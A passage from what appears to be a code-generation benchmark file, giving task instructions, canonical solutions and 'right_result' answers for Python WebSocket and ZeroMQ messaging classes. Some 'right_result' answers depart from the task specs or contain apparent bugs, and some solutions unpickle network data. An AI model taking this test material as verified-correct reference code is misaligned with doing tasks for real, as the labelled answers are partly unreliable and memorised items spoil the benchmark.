frames_per_buffer=self.CHUNK)\n        while True:\n            if self.recording:\n                try:\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"start\": True}))\n                    while self.recording:\n                        data = self.input_stream.read(self.CHUNK, exception_on_overflow=False)\n                        await self.websocket.send(data)\n                    await self.websocket.send(json.dumps({\"role\": \"user\", \"type\": \"audio\", \"format\": \"bytes.wav\", \"end\": True}))\n                except Exception as e:\n                    print(f\"Error in send_audio: {e}\")\n            await asyncio.sleep(0.01)\n\n    async def receive_audio(self):\n        self.output_stream = self.p.open(format=self.FORMAT, channels=self.CHANNELS, rate=self.PLAYBACK_RATE, output=True, frames_per_buffer=self.CHUNK)\n        while True:\n            try:\n                data = await self.websocket.recv()\n                if self.play_audio and isinstance(data, bytes) and not self.recording:\n                    self.output_stream.write(data)\n            except Exception as e:\n                await self.connect_with_retry()\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl and not self.recording:\n            print(\"\")\n            self.spinner.start()\n            self.recording = True\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.spinner.stop()\n            self.recording = False\n\n    async def main(self):\n        await self.connect_with_retry()\n        print(\"\\nHold CTRL to speak to your assistant. Press 'CTRL-C' to quit.\")\n        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)\n        listener.start()\n        await asyncio.gather(self.send_audio(), self.receive_audio())\n\n    def start(self):\n        asyncio.run(self.main())",
    "Code_level": "Class-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport pyaudio\nimport keyboard\nimport time\nfrom yaspin import yaspin\nimport threading\n\nclass Device:\n    def __init__(self):\n        self.server_url: str = \"ws://localhost:8765\"\n        self.p: pyaudio.PyAudio = pyaudio.PyAudio()\n        self.websocket: websockets.WebSocketClientProtocol = None\n        self.recording: bool = False\n        self.input_stream = None\n        self.output_stream = None\n        self.spinner = yaspin(text=\"Recording\", color=\"cyan\")\n        self.play_audio: bool = True\n        self.CHUNK: int = 1024\n        self.FORMAT: int = pyaudio.paInt16\n        self.CHANNELS: int = 1\n        self.RECORDING_RATE: int = 16000\n        self.PLAYBACK_RATE: int = 24000\n\n    async def connect_with_retry(self, max_retries: int = 50, retry_delay: int = 2):\n        for attempt in range(max_retries):\n            try:\n                self.websocket = await websockets.connect(self.server_url)\n                print(\"Connected to server\")\n                return\n            except Exception as e:\n                print(f\"Connection failed (attempt {attempt + 1}/{max_retries}): {e}\")\n                if attempt < max_retries - 1:\n                    print(f\"Retrying in {retry_delay} seconds...\")\n                    await asyncio.sleep(retry_delay)\n        raise ConnectionError(\"Failed to connect to server after maximum retries\")\n\n    def send_audio(self):\n        loop = asyncio.new_event_loop()\n        asyncio.set_event_loop(loop)\n        while True:\n            if self.recording and self.websocket:\n                try:\n                    data = self.input_stream.read(self.CHUNK, exception_on_overflow=False)\n                    loop.run_until_complete(self.websocket.send(data))\n                except Exception as e:\n                    print(f\"Error sending audio: {e}\")\n                    break\n            else:\n                time.sleep(0.01)\n\n    async def receive_audio(self):\n        while True:\n            try:\n                message = await self.websocket.recv()\n                if self.play_audio:\n                    self.output_stream.write(message)\n            except websockets.exceptions.ConnectionClosed:\n                print(\"Connection closed\")\n                break\n            except Exception as e:\n                print(f\"Error receiving audio: {e}\")\n\n    def on_press(self, key):\n        if key == keyboard.Key.ctrl and not self.recording:\n            self.recording = True\n            self.spinner.start()\n\n    def on_release(self, key):\n        if key == keyboard.Key.ctrl:\n            self.recording = False\n            self.spinner.stop()\n\n    async def main(self):\n        await self.connect_with_retry()\n        self.input_stream = self.p.open(\n            format=self.FORMAT,\n            channels=self.CHANNELS,\n            rate=self.RECORDING_RATE,\n            input=True,\n            frames_per_buffer=self.CHUNK\n        )\n        self.output_stream = self.p.open(\n            format=self.FORMAT,\n            channels=self.CHANNELS,\n            rate=self.PLAYBACK_RATE,\n            output=True,\n            frames_per_buffer=self.CHUNK\n        )\n        sender_thread = threading.Thread(target=self.send_audio, daemon=True)\n        sender_thread.start()\n        receiver_task = asyncio.create_task(self.receive_audio())\n        keyboard.Listener(on_press=self.on_press, on_release=self.on_release).start()\n        await asyncio.gather(receiver_task)\n\n    def start(self):\n        try:\n            asyncio.run(self.main())\n        except KeyboardInterrupt:\n            print(\"\\nShutting down...\")\n            if self.input_stream:\n                self.input_stream.stop_stream()\n                self.input_stream.close()\n            if self.output_stream:\n                self.output_stream.stop_stream()\n                self.output_stream.close()\n            self.p.terminate()"
  },
  {
    "Task_id": 470,
    "Instruction": "Task Description: Implement a WebSocket server using Python's asyncio and websockets libraries to handle client connections, process incoming JSON messages, and send responses back to clients.\n\nFunction Description: The server function handles WebSocket connections, processes incoming JSON messages, performs different operations based on the 'function' field in the JSON data, and sends back appropriate responses.\n\nInput:\n- websocket: WebSocket connection object (provided by websockets library)\n- path: str - The path requested by the client (provided by websockets library)\n\nOutput: None (The function runs indefinitely to handle WebSocket connections and messages)\n\nTask Description: Create a WebSocket server that starts listening on a specified host and port, and maintains persistent connections with clients to exchange JSON-formatted messages.\n\nFunction Description: The start_websocket_server function initializes and starts a WebSocket server that listens on localhost:5150, using the server function to handle incoming connections and messages.\n\nInput: None\n\nOutput: None (The function runs indefinitely to keep the server active)",
    "Canonical_solution": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n  while True:\n    # Get received data from websocket\n    data = await websocket.recv()\n    print (\"Received: \" + data)\n    json_data = json.loads(data)\n    if json_data.get('function') == 'echo':\n      #echo back the first argument\n      json_data['return'] = json_data['args'][0]\n    elif json_data.get('function') == 'ask':\n      #echo back the first argument\n      json_data['return'] = input(json_data['args'][0])\n    elif json_data.get('function') == 'throw':\n      #throw the first argument\n      json_data['throw'] = json_data['args'][0]\n    elif not json_data.get('function') is None:\n      json_data['throw'] = 'Unknown function : ' + json_data['function']\n\n    # Send response back to client to acknowledge receiving message\n    response = json.dumps(json_data)\n    print (\"Responding: \" + response)\n    await websocket.send(response)\n\ndef start_websocket_server():\n    # Create websocket server\n    start_server = websockets.serve(server, \"localhost\", 5150)\n    # Start and run websocket server forever\n    asyncio.get_event_loop().run_until_complete(start_server)\n    print(\"Starting loop\")\n    asyncio.get_event_loop().run_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 45,
    "right_result": "import asyncio\nimport websockets\nimport json\n\nasync def server(websocket, path):\n    async for message in websocket:\n        try:\n            data = json.loads(message)\n            if data.get(\"function\") == \"greet\":\n                response = {\"message\": f\"Hello, {data.get('name', 'Guest')}!\"}\n            elif data.get(\"function\") == \"add\":\n                a = data.get(\"a\", 0)\n                b = data.get(\"b\", 0)\n                response = {\"result\": a + b}\n            else:\n                response = {\"error\": \"Unknown function\"}\n            await websocket.send(json.dumps(response))\n        except Exception as e:\n            await websocket.send(json.dumps({\"error\": str(e)}))\n\nasync def start_websocket_server():\n    async with websockets.serve(server, \"localhost\", 5150):\n        await asyncio.Future()\n\nif __name__ == \"__main__\":\n    asyncio.run(start_websocket_server())"
  },
  {
    "Task_id": 471,
    "Instruction": "Task Description: Implement a ZeroMQ-based RPC client class in Python that subscribes to messages from a publisher, handles heartbeats, and manages connection states.\n\nClass Description: The RpcClient class establishes a ZeroMQ SUB socket to receive messages from a publisher, monitors connection health through heartbeats, and provides callback functionality for message processing.\n\nAttributes:\n- _context: zmq.Context - ZeroMQ context for socket management\n- _socket_sub: zmq.Socket - SUB socket for receiving messages\n- _active: bool - Flag indicating if the client is running\n- _thread: threading.Thread - Thread for running the message loop\n- _lock: threading.Lock - Thread synchronization lock\n- _last_received_ping: float - Timestamp of last received heartbeat\n\nMethods:\n- __init__() -> None - Initializes the ZeroMQ context and SUB socket with keepalive options\n- start(sub_address: str) -> None - Connects to the publisher and starts the message loop thread\n- stop() -> None - Stops the message loop thread\n- join() -> None - Waits for the message loop thread to complete\n- run() -> None - Main message processing loop (handles heartbeats and disconnections)\n- callback(topic: str, data: Any) -> None - Abstract method for processing received messages (to be implemented by subclasses)\n- subscribe_topic(topic: str) -> None - Subscribes to a specific message topic\n- on_disconnected() -> None - Handles disconnection events (prints warning message)",
    "Canonical_solution": "import threading\nfrom time import time\nfrom functools import lru_cache\nfrom typing import Any\nimport zmq\n\nclass RpcClient:\n    def __init__(self) -> None:\n        self._context: zmq.Context = zmq.Context()\n        self._socket_sub: zmq.Socket = self._context.socket(zmq.SUB)\n        \n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE, 1)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE_IDLE, 60)\n\n        self._active: bool = False\n        self._thread: threading.Thread = None\n        self._lock: threading.Lock = threading.Lock()\n        self._last_received_ping: time = time()\n\n    def start(self, sub_address: str) -> None:\n        if self._active:\n            return\n\n        self._socket_sub.connect(sub_address)\n        self._active = True\n        self._thread = threading.Thread(target=self.run)\n        self._thread.start()\n        self._last_received_ping = time()\n\n    def stop(self) -> None:\n        if not self._active:\n            return\n        self._active = False\n\n    def join(self) -> None:\n        if self._thread and self._thread.is_alive():\n            self._thread.join()\n        self._thread = None\n\n    def run(self) -> None:\n        pull_tolerance: int = HEARTBEAT_TOLERANCE * 1000\n\n        while self._active:\n            if not self._socket_sub.poll(pull_tolerance):\n                self.on_disconnected()\n                continue\n\n            topic, data = self._socket_sub.recv_pyobj(flags=zmq.NOBLOCK)\n\n            if topic == HEARTBEAT_TOPIC:\n                self._last_received_ping = data\n            else:\n                self.callback(topic, data)\n\n        self._socket_sub.close()\n\n    def callback(self, topic: str, data: Any) -> None:\n        raise NotImplementedError\n\n    def subscribe_topic(self, topic: str) -> None:\n        self._socket_sub.setsockopt_string(zmq.SUBSCRIBE, topic)\n\n    def on_disconnected(self):\n        msg: str = f\"RpcServer has no response over {HEARTBEAT_TOLERANCE} seconds, please check you connection.\"\n        print(msg)",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport threading\nimport time\nfrom typing import Any\n\nclass RpcClient:\n    def __init__(self):\n        self._context = zmq.Context()\n        self._socket_sub = self._context.socket(zmq.SUB)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE, 1)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE_IDLE, 60)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE_CNT, 3)\n        self._socket_sub.setsockopt(zmq.TCP_KEEPALIVE_INTVL, 10)\n        self._active = False\n        self._thread = None\n        self._lock = threading.Lock()\n        self._last_received_ping = time.time()\n\n    def start(self, sub_address: str) -> None:\n        with self._lock:\n            if not self._active:\n                self._socket_sub.connect(sub_address)\n                self._active = True\n                self._thread = threading.Thread(target=self.run)\n                self._thread.start()\n\n    def stop(self) -> None:\n        with self._lock:\n            self._active = False\n\n    def join(self) -> None:\n        if self._thread:\n            self._thread.join()\n\n    def run(self) -> None:\n        while self._active:\n            try:\n                topic = self._socket_sub.recv_string(flags=zmq.NOBLOCK)\n                data = self._socket_sub.recv_pyobj(flags=zmq.NOBLOCK)\n                if topic == \"HEARTBEAT\":\n                    self._last_received_ping = time.time()\n                else:\n                    self.callback(topic, data)\n            except zmq.Again:\n                time.sleep(0.1)\n                if time.time() - self._last_received_ping > 5:\n                    self.on_disconnected()\n                    with self._lock:\n                        if self._active:\n                            self._socket_sub.disconnect(self._socket_sub.getsockopt(zmq.LAST_ENDPOINT).decode())\n                            self._socket_sub.connect(self._socket_sub.getsockopt(zmq.IDENTITY).decode())\n                            self._last_received_ping = time.time()\n            except Exception as e:\n                print(f\"Error in message loop: {e}\")\n                time.sleep(1)\n\n    def callback(self, topic: str, data: Any) -> None:\n        raise NotImplementedError(\"callback method must be implemented by subclass\")\n\n    def subscribe_topic(self, topic: str) -> None:\n        self._socket_sub.setsockopt_string(zmq.SUBSCRIBE, topic)\n\n    def on_disconnected(self) -> None:\n        print(\"Warning: Disconnected from publisher\")"
  },
  {
    "Task_id": 472,
    "Instruction": "Task Description: Implement a ZeroMQ consumer class in Python that subscribes to messages from a publisher using the PUB/SUB pattern, with timeout handling for message reception.\n\nClass Description: The ZeroMQConsumer class establishes a connection to a ZeroMQ publisher, subscribes to all messages, and provides methods to receive messages and clean up resources.\n\nAttributes:\n- _zmq_context: zmq.Context - The ZeroMQ context for managing sockets\n- socket: zmq.Socket - The SUB socket for receiving messages from the publisher\n\nMethods:\n- __init__(zmq_port: int) -> None - Initializes the consumer with a connection to the specified port\n  - Input: zmq_port (int) - The port number to connect to the publisher\n  - Output: None\n- receive_message() -> Dict[str, Any] - Receives and parses a message from the publisher\n  - Input: None\n  - Output: Dict[str, Any] - The parsed message content or empty dict if timeout occurs\n- close() -> None - Closes the socket and terminates the context\n  - Input: None\n  - Output: None",
    "Canonical_solution": "import zmq\nfrom typing import Dict, Any\nimport ujson\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_port: int):\n        self._zmq_context = zmq.Context()\n        self.socket = self._zmq_context.socket(zmq.SUB)\n        self.socket.connect(f\"tcp://localhost:{zmq_port}\")\n        self.socket.setsockopt_string(zmq.SUBSCRIBE, \"\")\n        self.socket.setsockopt(zmq.RCVTIMEO, 100)  # ZMQ_RECV_TIMEOUT\n\n    def receive_message(self) -> Dict[str, Any]:\n        try:\n            json_data = self.socket.recv_string()\n            return ujson.loads(json_data)\n        except zmq.Again:\n            return {}\n\n    def close(self):\n        self.socket.close()\n        self._zmq_context.term()",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport json\nfrom typing import Dict, Any\n\nclass ZeroMQConsumer:\n    def __init__(self, zmq_port: int) -> None:\n        self._zmq_context = zmq.Context()\n        self.socket = self._zmq_context.socket(zmq.SUB)\n        self.socket.connect(f\"tcp://127.0.0.1:{zmq_port}\")\n        self.socket.setsockopt_string(zmq.SUBSCRIBE, '')\n\n    def receive_message(self) -> Dict[str, Any]:\n        try:\n            message = self.socket.recv(zmq.NOBLOCK)\n            return json.loads(message.decode('utf-8'))\n        except zmq.Again:\n            return {}\n        except Exception as e:\n            return {}\n\n    def close(self) -> None:\n        self.socket.close()\n        self._zmq_context.term()"
  },
  {
    "Task_id": 473,
    "Instruction": "Task Description: Implement a ZeroMQ-based message manager class for handling publish-subscribe communication between processes, supporting both message publishing and subscription functionalities.\n\nClass Description: The ZmqManager class provides an interface for ZeroMQ-based inter-process communication using PUB/SUB and PUSH/PULL patterns. It handles message serialization/deserialization and manages connections to publisher/subscriber endpoints.\n\nAttributes:\n- sink: [zmq.Socket] - ZeroMQ PUSH socket for sending messages to the publisher\n- sub: [zmq.Socket] - ZeroMQ SUB socket for receiving messages from the publisher\n- channel: [str] - The communication channel identifier for message filtering\n\nMethods:\n- __init__(url: str = 'zmq+tcp://localhost:5555+5556', channel: str = 'socketio', write_only: bool = False) -> None - Initializes the ZeroMQ connections. Parses the connection URL and sets up both PUSH and SUB sockets.\n- _publish(data: Any) -> None - Serializes and publishes data to the specified channel using pickle.\n- zmq_listen() -> Generator[bytes, None, None] - Continuously listens for incoming messages from the SUB socket and yields raw byte messages.\n- _listen() -> Generator[Any, None, None] - Listens for messages, deserializes them using pickle, and yields only messages matching the specified channel.",
    "Canonical_solution": "import pickle\nimport re\nfrom eventlet.green import zmq\n\nclass ZmqManager:\n    def __init__(self, url='zmq+tcp://localhost:5555+5556', channel='socketio', write_only=False):\n        r = re.compile(r':\\d+\\+\\d+$')\n        if not (url.startswith('zmq+tcp://') and r.search(url)):\n            raise RuntimeError('unexpected connection string: ' + url)\n\n        url = url.replace('zmq+', '')\n        (sink_url, sub_port) = url.split('+')\n        sink_port = sink_url.split(':')[-1]\n        sub_url = sink_url.replace(sink_port, sub_port)\n\n        sink = zmq.Context().socket(zmq.PUSH)\n        sink.connect(sink_url)\n\n        sub = zmq.Context().socket(zmq.SUB)\n        sub.setsockopt_string(zmq.SUBSCRIBE, '')\n        sub.connect(sub_url)\n\n        self.sink = sink\n        self.sub = sub\n        self.channel = channel\n\n    def _publish(self, data):\n        pickled_data = pickle.dumps(\n            {\n                'type': 'message',\n                'channel': self.channel,\n                'data': data\n            }\n        )\n        return self.sink.send(pickled_data)\n\n    def zmq_listen(self):\n        while True:\n            response = self.sub.recv()\n            if response is not None:\n                yield response\n\n    def _listen(self):\n        for message in self.zmq_listen():\n            if isinstance(message, bytes):\n                try:\n                    message = pickle.loads(message)\n                except Exception:\n                    pass\n            if isinstance(message, dict) and \\\n                    message['type'] == 'message' and \\\n                    message['channel'] == self.channel and \\\n                    'data' in message:\n                yield message['data']\n        return",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport pickle\nfrom typing import Any, Generator\n\nclass ZmqManager:\n    def __init__(self, url: str = 'zmq+tcp://localhost:5555+5556', channel: str = 'socketio', write_only: bool = False) -> None:\n        self.context = zmq.Context()\n        self.channel = channel.encode('utf-8') if isinstance(channel, str) else channel\n        parts = url.split('+')\n        protocol = parts[0][4:] if len(parts) > 0 else 'tcp'\n        host = parts[1].split('//')[1] if len(parts) > 1 else 'localhost:5555+5556'\n        ports = host.split('+') if '+' in host else [host]\n        push_port = ports[0]\n        pull_port = ports[1] if len(ports) > 1 else ports[0]\n\n        self.sink = self.context.socket(zmq.PUSH)\n        self.sink.connect(f\"{protocol}://{push_port}\")\n\n        if not write_only:\n            self.sub = self.context.socket(zmq.SUB)\n            self.sub.connect(f\"{protocol}://{pull_port}\")\n            self.sub.setsockopt(zmq.SUBSCRIBE, self.channel)\n        else:\n            self.sub = None\n\n    def _publish(self, data: Any) -> None:\n        msg = pickle.dumps((self.channel, data))\n        self.sink.send(msg)\n\n    def zmq_listen(self) -> Generator[bytes, None, None]:\n        while True:\n            try:\n                yield self.sub.recv()\n            except (zmq.Again, zmq.ZMQError):\n                continue\n\n    def _listen(self) -> Generator[Any, None, None]:\n        for raw_msg in self.zmq_listen():\n            try:\n                channel, data = pickle.loads(raw_msg)\n                if channel == self.channel:\n                    yield data\n            except (pickle.PickleError, ValueError, TypeError, EOFError):\n                continue"
  },
  {
    "Task_id": 474,
    "Instruction": "Task Description: Implement a ZeroMQ-based client class for bidirectional communication with a server, capable of sending text data and receiving processed results as NumPy arrays.\n\nClass Description: BertClient is a ZeroMQ client that establishes PUSH-SUB pattern communication with a server. It sends text data for processing and subscribes to receive the processed results as NumPy arrays.\n\nAttributes:\n- context: zmq.Context - ZeroMQ context for socket management\n- sender: zmq.Socket - PUSH socket for sending requests to server\n- receiver: zmq.Socket - SUB socket for receiving responses from server\n- identity: bytes - Unique client identifier\n- request_id: int - Counter for tracking pending requests\n- timeout: int - Timeout setting for operations\n- pending_request: set - Set of outstanding request IDs\n\nMethods:\n- __init__(ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1) -> None - Initializes the client with server connection details\n- close() -> None - Closes sockets and terminates context\n- _send(msg, msg_len=0) -> None - Internal method for sending messages to server\n- _recv() -> Response - Internal method for receiving raw responses\n- _recv_ndarray() -> Response - Internal method for receiving and decoding NumPy array responses\n- encode(texts, blocking=True) -> Optional[np.ndarray] - Sends texts for encoding and returns processed arrays\n- fetch(delay=0.0) -> Generator[Response, None, None] - Yields pending responses with optional delay\n- fetch_all(sort=True, concat=False) -> Union[List[np.ndarray], np.ndarray] - Retrieves all pending responses with sorting and concatenation options",
    "Canonical_solution": "import sys\nimport uuid\nimport zmq\nfrom zmq.utils import jsonapi\nimport numpy as np\nimport pickle\nfrom collections import namedtuple\n\nResponse = namedtuple('Response', ['id', 'content'])\n\nclass BertClient:\n    def __init__(self, ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1):\n        self.context = zmq.Context()\n        self.sender = self.context.socket(zmq.PUSH)\n        self.sender.setsockopt(zmq.LINGER, 0)\n        self.identity = identity or str(uuid.uuid4()).encode('ascii')\n        self.sender.connect('tcp://%s:%d' % (ip, port))\n\n        self.receiver = self.context.socket(zmq.SUB)\n        self.receiver.setsockopt(zmq.LINGER, 0)\n        self.receiver.setsockopt(zmq.SUBSCRIBE, self.identity)\n        self.receiver.connect('tcp://%s:%d' % (ip, port_out))\n\n        self.request_id = 0\n        self.timeout = timeout\n        self.pending_request = set()\n\n    def close(self):\n        self.sender.close()\n        self.receiver.close()\n        self.context.term()\n\n    def _send(self, msg, msg_len=0):\n        self.sender.send_multipart([self.identity, msg, b'%d' % self.request_id, b'%d' % msg_len])\n        self.pending_request.add(self.request_id)\n        self.request_id += 1\n\n    def _recv(self):\n        response = self.receiver.recv_multipart()\n        request_id = int(response[-1])\n        self.pending_request.remove(request_id)\n        return Response(request_id, response)\n\n    def _recv_ndarray(self):\n        request_id, response = self._recv()\n        arr_info, arr_val = jsonapi.loads(response[1]), response[2]\n        X = np.frombuffer(memoryview(arr_val), dtype=str(arr_info['dtype']))\n        return Response(request_id, X.reshape(arr_info['shape']))\n\n    def encode(self, texts, blocking=True):\n        self._send(jsonapi.dumps(texts), len(texts))\n        rst = self._recv_ndarray().content if blocking else None\n        return rst\n\n    def fetch(self, delay=.0):\n        time.sleep(delay)\n        while self.pending_request:\n            yield self._recv_ndarray()\n\n    def fetch_all(self, sort=True, concat=False):\n        if self.pending_request:\n            tmp = list(self.fetch())\n            if sort:\n                tmp = sorted(tmp, key=lambda v: v.id)\n            tmp = [v.content for v in tmp]\n            if concat:\n                tmp = np.concatenate(tmp, axis=0)\n            return tmp",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\nimport numpy as np\nfrom typing import Optional, Generator, List, Union\nimport time\nimport uuid\n\nclass Response:\n    def __init__(self, request_id: int, content: np.ndarray):\n        self.request_id = request_id\n        self.content = content\n\nclass BertClient:\n    def __init__(self, ip='localhost', port=5555, port_out=5556, identity=None, timeout=-1):\n        self.context = zmq.Context()\n        self.sender = self.context.socket(zmq.PUSH)\n        self.receiver = self.context.socket(zmq.SUB)\n        self.identity = identity if identity is not None else str(uuid.uuid4()).encode('ascii')\n        self.timeout = timeout\n        self.request_id = 0\n        self.pending_request = set()\n        \n        self.sender.connect(f'tcp://{ip}:{port}')\n        self.receiver.connect(f'tcp://{ip}:{port_out}')\n        self.receiver.setsockopt(zmq.SUBSCRIBE, self.identity)\n\n    def close(self):\n        self.sender.close()\n        self.receiver.close()\n        self.context.term()\n\n    def _send(self, msg, msg_len=0):\n        self.sender.send_multipart([self.identity, msg, f\"{self.request_id}\".encode('utf-8')])\n        self.pending_request.add(self.request_id)\n        self.request_id += 1\n\n    def _recv(self):\n        try:\n            identity, payload, req_id = self.receiver.recv_multipart(flags=zmq.NOBLOCK if self.timeout == 0 else 0)\n            req_id = int(req_id)\n            if req_id in self.pending_request:\n                self.pending_request.remove(req_id)\n                return Response(req_id, payload)\n        except zmq.Again:\n            pass\n        return None\n\n    def _recv_ndarray(self):\n        response = self._recv()\n        if response and isinstance(response.content, bytes):\n            arr = np.frombuffer(response.content, dtype=np.float32)\n            return Response(response.request_id, arr)\n        return response\n\n    def encode(self, texts, blocking=True):\n        serialized = '|'.join(texts).encode('utf-8')\n        self._send(serialized, len(texts))\n        \n        if blocking:\n            while True:\n                response = self._recv_ndarray()\n                if response and response.request_id == self.request_id - 1:\n                    return response.content\n                time.sleep(0.01)\n        return None\n\n    def fetch(self, delay=0.0):\n        if delay > 0:\n            time.sleep(delay)\n        while True:\n            response = self._recv_ndarray()\n            if not response:\n                break\n            yield response\n\n    def fetch_all(self, sort=True, concat=False):\n        responses = list(self.fetch())\n        if sort:\n            responses.sort(key=lambda r: r.request_id)\n        arrays = [r.content for r in responses]\n        if concat:\n            return np.concatenate(arrays)\n        return arrays if not concat else np.vstack(arrays)"
  },
  {
    "Task_id": 475,
    "Instruction": "Task Description: Implement a ZeroMQ subscriber in Python that connects to a publisher and continuously receives messages.\n\nFunction Description: The function `setup_zmq_subscriber` initializes a ZeroMQ subscriber socket, connects it to a specified publisher endpoint, and configures it to subscribe to all messages. The function `receive_messages` continuously listens for and prints messages received through the socket.\n\nInput: \n- `remote_ip` (str, optional): The endpoint address of the ZeroMQ publisher in the format 'tcp://IP_ADDRESS:PORT'. Defaults to 'tcp://REMOTE_IP_ADDRESS:5555'.\n\nOutput: \n- `socket` (zmq.Socket): A configured ZeroMQ SUB socket ready to receive messages.\n- None (for `receive_messages`): The function runs indefinitely, printing received messages.",
    "Canonical_solution": "import zmq\n\ndef setup_zmq_subscriber(remote_ip='tcp://REMOTE_IP_ADDRESS:5555'):\n    context = zmq.Context()\n    socket = context.socket(zmq.SUB)\n    socket.connect(remote_ip)\n    socket.setsockopt_string(zmq.SUBSCRIBE, '')\n    return socket\n\ndef receive_messages(socket):\n    while True:\n        msg = socket.recv_string()\n        print(msg)",
    "Code_level": "Function-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\ndef setup_zmq_subscriber(remote_ip='tcp://REMOTE_IP_ADDRESS:5555'):\n    context = zmq.Context()\n    socket = context.socket(zmq.SUB)\n    socket.connect(remote_ip)\n    socket.setsockopt_string(zmq.SUBSCRIBE, '')\n    return socket\n\ndef receive_messages(socket):\n    while True:\n        message = socket.recv_string()\n        print(f\"Received: {message}\")"
  },
  {
    "Task_id": 476,
    "Instruction": "Task Description: Create a Python class that connects to a remote progress bar using ZeroMQ's PUB/SUB pattern to receive and display progress updates from a separate process.\n\nClass Description: The RemoteProgress class establishes a ZeroMQ SUB socket to subscribe to progress updates broadcast by a publisher process. It continuously receives messages containing progress percentages and labels, displaying them in a formatted way until interrupted.\n\nAttributes:\n- hostname: str - The hostname or IP address of the publisher (default: 'localhost')\n- port: int - The port number to connect to (default: 8080)\n- label: str - The current progress label received from the publisher\n\nMethods:\n- __init__(port: int = 8080, hostname: str = 'localhost') -> None - Initializes the RemoteProgress instance with connection parameters\n- __call__() -> None - Main method that establishes the connection, receives messages, and displays progress (runs in an infinite loop until interrupted)\n- _display_progress(percentage: float) -> None - Helper method that formats and displays the progress percentage (private method)",
    "Canonical_solution": "import zmq\nfrom typing import Optional\n\nclass RemoteProgress:\n    \"\"\"\n    Connect to a progress bar in a separate process with output_mode\n    set to 'broadcast' in order to display the results (to stdout).\n    \"\"\"\n\n    def __init__(self, port: int = 8080, hostname: str = 'localhost'):\n        self.hostname = hostname\n        self.port = port\n        self.label = \"\"\n\n    def __call__(self):\n        context = zmq.Context()\n        sock = context.socket(zmq.SUB)\n        sock.setsockopt(zmq.SUBSCRIBE, b'')\n        sock.connect('tcp://' + self.hostname +':'+str(self.port))\n        \n        percent = None\n        while True:\n            try:\n                message = sock.recv()\n                [percent_str, label] = message.split(b'|')\n                percent = float(percent_str)\n                self.label = label.decode()\n                self._display_progress(percent)\n            except KeyboardInterrupt:\n                if percent is not None:\n                    print(f\"Exited at {percent:.3f}% completion\")\n                break\n            except Exception:\n                print(f\"Could not process socket message: {message!r}\")\n\n    def _display_progress(self, percentage: float):\n        print(f\"\\r{self.label}: {percentage:.1f}%\", end='')",
    "Code_level": "Class-level",
    "FSMID_for_test": 85,
    "right_result": "import zmq\n\nclass RemoteProgress:\n    def __init__(self, port: int = 8080, hostname: str = 'localhost') -> None:\n        self.hostname = hostname\n        self.port = port\n        self.label = \"\"\n        context = zmq.Context()\n        self.socket = context.socket(zmq.SUB)\n        self.socket.connect(f\"tcp://{self.hostname}:{self.port}\")\n        self.socket.setsockopt_string(zmq.SUBSCRIBE, \"\")\n\n    def __call__(self) -> None:\n        try:\n            while True:\n                message = self.socket.recv_string()\n                parts = message.split()\n                if len(parts) >= 2 and parts[0].replace('.', '', 1).isdigit():\n                    percentage = float(parts[0])\n                    self.label = \" \".join(parts[1:])\n                    self._display_progress(percentage)\n        except KeyboardInterrupt:\n            pass\n        finally:\n            self.socket.close()\n\n    def _display_progress(self, percentage: float) -> None:\n        print(f\"[{percentage:.2f}%] {self.label}\")"
  },
  {
    "Task_id": 477,
    "Instruction": "Task Description: Implement a ZeroMQ-based network communication class that supports PUB/SUB pattern for sending and receiving messages between processes, with optional frame compression and message handling.\n\nClass Description: NetGear is a ZeroMQ wrapper class that facilitates network communication using various messaging patterns, with a focus on PUB/SUB pattern. It handles socket creation, connection management, message serialization, and frame compression/decompression.\n\nAttributes:\n- __logging: bool - Enables/disables logging functionality\n- __msg_context: zmq.Context - ZeroMQ context instance for socket management\n- __receive_mode: bool - Flag indicating if instance is in receive mode\n- __pattern: int - Selected messaging pattern (0: PAIR, 1: REQ/REP, 2: PUB/SUB)\n- __terminate: bool - Flag for graceful termination\n- __msg_socket: zmq.Socket - ZeroMQ socket instance\n- __subscriber_timeout: int - Timeout value for subscriber socket (in seconds)\n- __queue: deque - Buffer for storing received frames (receiver only)\n- __thread: Thread - Background thread for message handling (receiver only)\n\nMethods:\n- __init__(address=None, port=None, protocol=None, pattern=0, receive_mode=False, logging=False, **options) -> None - Initializes the NetGear instance with specified parameters\n- __recv_handler() -> None - Internal thread handler for receiving messages (receiver only)\n- recv() -> np.ndarray|None - Receives and returns a frame from the queue (receiver only)\n- send(frame, message=None) -> None - Sends a frame with optional metadata (sender only)\n- close(kill=False) -> None - Closes the connection and cleans up resources",
